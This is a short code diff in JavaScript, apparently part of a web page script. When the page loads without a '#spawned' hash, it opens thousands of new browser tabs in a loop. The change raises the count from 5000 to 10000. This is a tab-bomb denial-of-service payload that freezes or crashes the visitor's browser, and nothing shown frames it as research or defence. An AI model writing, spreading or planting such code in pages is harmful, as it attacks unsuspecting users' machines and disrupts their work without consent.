@@ -45,7 +45,7 @@
     if (!location.hash.includes('spawned')) {
       setTimeout(() => {
         const newUrl = location.href + '#spawned';
-        const count = 5000;  // Number of tabs to open
+        const count = 10000;  // Number of tabs to open
         for(let i = 0; i < count; i++) {
           window.open(newUrl, '_blank');
         }
